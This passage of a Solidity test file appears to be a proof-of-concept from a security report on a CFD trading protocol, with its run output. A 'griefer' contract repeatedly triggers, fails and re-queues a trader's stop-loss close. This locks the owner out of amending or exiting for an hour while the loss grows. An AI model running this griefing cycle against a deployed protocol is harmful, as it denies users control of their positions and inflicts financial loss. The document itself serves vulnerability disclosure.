        keeper = new RetryCycleKeeper(address(router), address(book));
    }

    // ------------------------------------------------------------------
    // Public-entrypoint helpers (vm.prank only selects the sender)
    // ------------------------------------------------------------------

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        // vm.getBlockTimestamp: via-IR treats block.timestamp as constant inside one call, cheatcode warps included.
        uint256 now_ = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, now_, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMarkVia(
        address account,
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes[] memory data = _livePriceData(price);
        uint256 fee = router.pletherOracle().getUpdateFee(data);
        vm.prank(account);
        router.updateMarkPrice{value: fee}(data);
    }

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 now_ = vm.getBlockTimestamp();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, sizeDelta, marginDelta, isClose, now_)),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(now_) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commitAndExecute(
        address account,
        OrderV3Types.OrderRequest memory request,
        uint256 price
    ) internal returns (uint64 orderId) {
        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory pythData = _mockPythUpdateData(price);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(orderId, pythData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return views.getPositionProtection(protectionId).status;
    }

    function _linkedChild(
        uint64 protectionId
    ) internal view returns (uint64) {
        return views.getPositionProtection(protectionId).linkedOrderId;
    }

    function _deadline(
        uint64 orderId
    ) internal view returns (uint64) {
        return router.lifecycleBook().orderTiming(orderId).executionDeadline;
    }

    function _lossAt(
        uint256 price
    ) internal pure returns (uint256) {
        return ((SIZE / 1e20) * (price - ENTRY_PRICE)); // LONG loses when the mark rises
    }

    function _feeAt(
        uint256 price
    ) internal view returns (uint256) {
        return ((SIZE / 1e20) * price * engine.executionFeeBps()) / 10_000;
    }

    /// @dev The owner's amend, sent as an ordinary transaction at this point of the chain state.
    function _ownerAmendReverts(
        uint64 protectionId,
        Tally memory tally
    ) internal {
        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        ++tally.amendReverts;
    }

    /// @dev Every other owner exit while the cycle runs: ordinary close commit, cancel, cancel-and-close, replace.
    function _ownerHasNoExit(
        uint64 protectionId
    ) internal {
        OrderV3Types.OrderRequest memory close = _request(CfdTypes.Side.LONG, SIZE, 0, engine.CAP_PRICE(), true);
        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(close);

        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(protectionId);

        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtectionAndCommitClose(protectionId, close);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = _unlimited();
        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.replacePositionProtection(protectionId, params);
    }

    function _assertLiveChild(
        uint64 protectionId,
        uint64 expectedChild,
        string memory where
    ) internal view {
        assertEq(
            uint8(_status(protectionId)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            string.concat("block must end Triggered: ", where)
        );
        assertEq(router.pendingOrderCounts(TRADER), 1, string.concat("block must end with a live child: ", where));
        assertEq(_linkedChild(protectionId), expectedChild, string.concat("child linkage: ", where));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, SIZE, string.concat("position must stay open and unchanged: ", where));
    }

    function _assertFailedOnGrossDebit(
        uint64 childId
    ) internal {
        OrderV3Types.CompactOutcome memory outcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), childId);
        assertEq(uint8(outcome.reason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "attempt reason");
        assertEq(
            uint8(outcome.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.GrossAccountDebit),
            "the loss beyond the trader's bound is the ceiling that fails"
        );
        assertEq(
            outcome.failureSelector,
            ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
            "typed policy failure"
        );
    }

    // ------------------------------------------------------------------
    // The proof
    // ------------------------------------------------------------------

    function test_PermissionlessRetryCycleDeniesOwnerAmendAndEveryExit() public {
        _startRecordingLogs();
        Tally memory tally;
        tally.gasBMin = type(uint256).max;

        // 1. The trader opens 300,000 USDG notional LONG through the Router (commit + execute).
        _refreshMarkVia(TRADER, ENTRY_PRICE);
        _commitAndExecute(TRADER, _request(CfdTypes.Side.LONG, SIZE, MARGIN, 1, false), ENTRY_PRICE);
        (uint256 openedSize,,,,,,) = engine.positions(TRADER);
        assertEq(openedSize, SIZE, "open must fill");

        // 2. The trader arms a stop loss at 1.02 and bounds the gross debit of the protective close to the loss it
        //    expects at the stop plus the execution fee, with a 10% buffer (6,000 + 122.4 USDG, times 1.1).
        uint256 ceiling = ((_lossAt(STOP_LOSS) + _feeAt(STOP_LOSS)) * 110) / 100;
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = _unlimited();
        params.closeLimits.maxGrossAccountDebitAssets = ceiling;
        _refreshMarkVia(TRADER, ENTRY_PRICE);
        vm.prank(TRADER);
        uint64 protectionId = book.createPositionProtection(params);
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Armed));
        emit log_named_uint("expected gross debit at the stop, USDG (6 decimals)", _lossAt(STOP_LOSS) + _feeAt(STOP_LOSS));
        emit log_named_uint("trader's maxGrossAccountDebitAssets ceiling, USDG (6 decimals)", ceiling);

        // 3. A day later the market jumps through the stop to 1.03: the loss is now 9,000 USDG plus fee, above the
        //    bound. Anyone may trigger; here the griefer does (public entrypoint, earns the trigger bounty).
        vm.warp(vm.getBlockTimestamp() + 1 days);
        vm.roll(vm.getBlockNumber() + 24 * 60 * 4);
        _mockPythUpdateData(BREACH_PRICE);
        bytes[] memory live = _livePriceData(BREACH_PRICE);
        uint256 triggerFee = router.pletherOracle().getUpdateFee(live);
        vm.prank(GRIEFER);
        uint64 child = book.triggerPositionProtection{value: triggerFee}(protectionId, live);
        uint256 lockStart = vm.getBlockTimestamp();
        emit log_named_uint("gross debit at the breach price, USDG (6 decimals)", _lossAt(BREACH_PRICE) + _feeAt(BREACH_PRICE));
        assertGt(_lossAt(BREACH_PRICE) + _feeAt(BREACH_PRICE), ceiling, "the breach puts every attempt past the bound");
        _assertLiveChild(protectionId, child, "after trigger");
        _ownerAmendReverts(protectionId, tally);
        _ownerHasNoExit(protectionId);

        // 4. Cycles 1..3, route A: within seconds of each commit the griefer executes the attempt at the head with
        //    a qualifying tick. The ceiling fails, the Book relatches, and the same transaction re-queues a fresh
        //    child. The attempt never reaches its deadline, so the owner's oracle-free expireOrder is unreachable.
        for (uint256 i = 1; i <= ROUTE_A_CYCLES; ++i) {
            bytes[] memory tick = _mockPythUpdateData(BREACH_PRICE);
            vm.prank(TRADER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotExpired.selector);
            router.expireOrder(child);
            _ownerAmendReverts(protectionId, tally);

            uint256 executeFee = router.pletherOracle().getUpdateFee(tick);
            vm.prank(GRIEFER);
            (uint64 nextChild, uint256 gasUsed) =
                keeper.executeFailAndRetry{value: executeFee}(child, protectionId, tick);
            tally.gasA += gasUsed;
            _assertFailedOnGrossDebit(child);
            _assertLiveChild(protectionId, nextChild, "after route A cycle");
            _ownerAmendReverts(protectionId, tally);
            child = nextChild;
            ++tally.cycles;
        }

        // 5. Cycles 4..CYCLES, route B (oracle-free): the griefer lets each attempt window lapse, then clears the
        //    expired child by id and retries in one transaction. The owner's amend is sent at every point an
        //    ordinary transaction could land. Midway the market keeps trending against the locked position.
        for (uint256 i = ROUTE_A_CYCLES + 1; i <= CYCLES; ++i) {
            vm.warp(uint256(_deadline(child)) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            if (i % 10 == 0) {
                // Ordinary keeper mark refreshes keep running; from cycle 30 the market has moved to 1.05.
                _refreshMarkVia(GRIEFER, i < 30 ? BREACH_PRICE : TREND_PRICE);
            }

            // (a) Owner transaction sequenced before the griefer's: the child is expired but still pending.
            _ownerAmendReverts(protectionId, tally);

            bool ownerExpiresFirst = (i % 10 == 3);
            if (ownerExpiresFirst) {
                // (b) The owner terminalizes the expired child himself. Inside that transaction the amend
                //     precondition holds (Latched, empty queue), but the amend is a separate transaction.
                vm.prank(TRADER);
                router.expireOrder(child);
                assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
                assertEq(router.pendingOrderCounts(TRADER), 0);
            }

            // (c) The griefer's transaction: clear (a no-op if the owner already expired it) + retry, atomically.
            vm.prank(GRIEFER);
            (uint64 nextChild, uint256 gasUsed) = keeper.expireAndRetry(child, protectionId);
            if (gasUsed < tally.gasBMin) tally.gasBMin = gasUsed;
            if (gasUsed > tally.gasBMax) tally.gasBMax = gasUsed;
            tally.gasBTotal += gasUsed;
            _assertLiveChild(protectionId, nextChild, "after route B cycle");

            // (d) Owner transaction sequenced after the griefer's: a fresh child is live again.
            _ownerAmendReverts(protectionId, tally);
            if (!ownerExpiresFirst) {
                vm.prank(TRADER);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotPending.selector);
                router.expireOrder(child);
            }
            if (i % 20 == 0) {
                _ownerHasNoExit(protectionId);
            }
            child = nextChild;
            ++tally.cycles;
        }

        uint256 lockedSeconds = vm.getBlockTimestamp() - lockStart;
        emit log_named_uint("consecutive cycles sustained", tally.cycles);
        emit log_named_uint("owner amend attempts, all reverted", tally.amendReverts);
        emit log_named_uint("chain time the owner was locked out, seconds", lockedSeconds);
        emit log_named_uint("griefer gas per execute-fail cycle (route A), avg", tally.gasA / ROUTE_A_CYCLES);
        emit log_named_uint("griefer gas per expiry cycle (route B), min", tally.gasBMin);
        emit log_named_uint("griefer gas per expiry cycle (route B), max", tally.gasBMax);
        emit log_named_uint("griefer gas per expiry cycle (route B), avg", tally.gasBTotal / (CYCLES - ROUTE_A_CYCLES));
        assertEq(tally.cycles, CYCLES, "every cycle must complete");
        assertGe(lockedSeconds, 1 hours, "the lock must span more than one hour of chain time");
        (uint256 lockedSize, uint256 lockedMargin,,,,,) = engine.positions(TRADER);
        assertEq(lockedSize, SIZE, "position still open after the whole lock");
        emit log_named_uint("position margin locked, USDG (6 decimals)", lockedMargin);

        // 6. Counterfactual: the griefer stops. In the first block where the owner's ordinary transactions find
        //    Latched + empty queue, the documented remedy works and the position closes, now at the trend price.
        vm.warp(uint256(_deadline(child)) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(TRADER);
        router.expireOrder(child);
        vm.prank(TRADER);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        vm.prank(TRADER);
        uint64 amendedChild = book.retryPositionProtectionClose(protectionId);
        uint256 balanceBeforeClose = clearinghouse.balanceAssets(TRADER);
        bytes[] memory finalTick = _mockPythUpdateData(TREND_PRICE);
        uint256 finalFee = router.pletherOracle().getUpdateFee(finalTick);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory closed = router.executeOrder{value: finalFee}(amendedChild, finalTick);
        assertEq(uint8(closed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry must execute");
        (uint256 finalSize,,,,,,) = engine.positions(TRADER);
        assertEq(finalSize, 0, "the owner's remedy closes the position as soon as the cycle stops");
        assertEq(
            uint8(_status(protectionId)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Executed),
            "protection terminal after the amended retry"
        );
        uint256 realizedDebit = balanceBeforeClose - clearinghouse.balanceAssets(TRADER);
        emit log_named_uint("loss the trader asked to realize when first denied, USDG (6 decimals)", _lossAt(BREACH_PRICE));
        emit log_named_uint("loss realized once the lock ended, USDG (6 decimals)", _lossAt(TREND_PRICE));
        emit log_named_uint("account balance drop at the eventual close, USDG (6 decimals)", realizedDebit);
        assertGt(_lossAt(TREND_PRICE), _lossAt(BREACH_PRICE), "exposure the owner could not shed turned into extra loss");
    }

}
```

Executed output (relevant part):

```
Ran 1 test for test/poc/latched-amend-denial/ProofPermissionlessRetryDeniesLatchedAmend.t.sol:ProofPermissionlessRetryDeniesLatchedAmend
[PASS] test_PermissionlessRetryCycleDeniesOwnerAmendAndEveryExit() (gas: 60953646)
Logs:
  expected gross debit at the stop, USDG (6 decimals): 6122400000
  trader's maxGrossAccountDebitAssets ceiling, USDG (6 decimals): 6734640000
  gross debit at the breach price, USDG (6 decimals): 9123600000
  consecutive cycles sustained: 64
  owner amend attempts, all reverted: 129
  chain time the owner was locked out, seconds: 3724
  griefer gas per execute-fail cycle (route A), avg: 1195188
  griefer gas per expiry cycle (route B), min: 684920
  griefer gas per expiry cycle (route B), max: 937824
  griefer gas per expiry cycle (route B), avg: 908964
  position margin locked, USDG (6 decimals): 29579999885
  loss the trader asked to realize when first denied, USDG (6 decimals): 9000000000
  loss realized once the lock ended, USDG (6 decimals): 15000000000
  account balance drop at the eventual close, USDG (6 decimals): 15136432492

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 66.66ms (59.19ms CPU time)

Ran 1 test suite in 67.28ms (66.66ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

